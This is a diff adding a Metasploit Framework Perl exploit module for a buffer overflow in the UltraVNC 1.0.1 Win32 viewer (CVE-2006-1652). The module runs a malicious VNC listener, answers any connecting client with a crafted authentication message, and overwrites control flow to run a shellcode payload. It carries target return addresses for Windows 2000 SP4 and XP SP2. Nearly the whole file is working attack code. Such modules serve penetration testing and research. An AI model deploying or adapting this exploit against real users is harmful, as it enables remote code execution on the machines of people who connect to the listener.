@@ -1,0 +1,160 @@
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::ultravnc_client;
+
+use strict;
+use base "Msf::Exploit";
+use Pex::Text;
+use IO::Socket::INET;
+use  POSIX;
+
+my $advanced =
+  {
+  };
+
+my $info =
+  {
+	'Name'           => 'UltraVNC 1.0.1 Client Buffer Overflow',
+	'Version'        => '$Revision: 1.1 $',
+	'Authors'        => [ 'y0 [at] w00t-shell.net' ],
+	'Description'    =>
+	  Pex::Text::Freeform(qq{
+	This module exploits a buffer overflow in UltraVNC Win32 Viewer 1.0.1 Release.
+
+}),
+
+	'Arch'           => [ 'x86' ],
+	'OS'             => [ 'win32', 'winxp', 'win2000' ],
+	'Priv'           => 0,
+
+	'UserOpts'       =>
+	  {
+		'VNCPORT'    => [ 1, 'PORT', 'The local VNC listener port', 5900       ],
+		'VNCSERVER'  => [ 1, 'HOST', 'The local VNC listener host', "0.0.0.0"  ],
+	  },
+
+	'AutoOpts' => { 'EXITFUNC' => 'process' },
+
+	'Payload'      =>
+	  {
+		'Space'    => 400,
+		'BadChars' => "\x00",
+		'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",
+		'MaxNops'  => 0,
+		'Keys'     => [ '-ws2ord', '-bind' ],
+	  },
+
+	'Refs'            =>
+	  [
+		[ 'BID', '17378' ],
+		[ 'CVE', '2006-1652' ],
+
+	  ],
+
+	'DefaultTarget'  => -1,
+
+	'Targets'        =>
+	  [
+		[ 'Windows 2000 SP4 English', 0x7c2ec68b ],
+		[ 'Windows XP SP2 English',   0x76b43ae0 ],
+	  ],
+
+	'Keys'           => [ 'vncviewer' ],
+
+	'DisclosureDate' => 'April 4 2006',
+  };
+
+sub new
+{
+	my $class = shift;
+	my $self;
+
+	$self = $class->SUPER::new(
+		{
+			'Info'     => $info,
+			'Advanced' => $advanced,
+		},
+		@_);
+
+	return $self;
+}
+
+sub Exploit
+{
+	my $self = shift;
+	my $server = IO::Socket::INET->new(
+		LocalHost => $self->GetVar('VNCSERVER'),
+		LocalPort => $self->GetVar('VNCPORT'),
+		ReuseAddr => 1,
+		Listen    => 1,
+		Proto     => 'tcp');
+	my $client;
+
+	# Did the listener create fail?
+	if (not defined($server))
+	{
+		$self->PrintLine("[-] Failed to create local VNC listener on " . $self->GetVar('VNCPORT'));
+		return;
+	}
+
+	$self->PrintLine("[*] Waiting for connections to " . $self->GetVar('VNCSERVER') . ":" . $self->GetVar('VNCPORT') . " ...");
+
+	while (defined($client = $server->accept()))
+	{
+		$self->HandleVNCClient(fd => Msf::Socket::Tcp->new_from_socket($client));
+	}
+
+	return;
+}
+
+sub HandleVNCClient
+{
+	my $self = shift;
+	my ($fd) = @{{@_}}{qw/fd/};
+	my $target    = $self->Targets->[$self->GetVar('TARGET')];
+	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
+	my $rhost;
+	my $rport;
+
+	# Set the remote host information
+	($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
+
+	my $filler = $self->MakeNops(980 - length($shellcode));
+
+	my $first =
+	  "RFB 003.006\n";
+
+	my $second =
+	  "\x00\x00\x00\x00\x00\x00\x04\x06". "Requires Ultr\@VNC Authentication\n".
+	  $shellcode. $filler. pack('V', $target->[1]). "PASSWORD". "\xe8".pack('V', -997);
+
+	$self->PrintLine("[*] VNC Client connected from $rhost:$rport...");
+
+	$fd->Send($first);
+
+	my $resp = $fd->Recv(-1);
+	chomp($resp);
+	$self->PrintLine('[*] VNC Client response: ' . $resp);
+
+	if($resp !~ /RFB 003\.004/) {
+		$self->PrintLine('[*] Not a UltraVNC client... ');
+		return;
+	}
+
+	$self->PrintLine("[*] Sending ". length($second). " bytes of payload...");
+
+	$fd->Send($second);
+	
+	$self->Handler($fd);
+	
+	$fd->Close();
+}
+
+1;
+
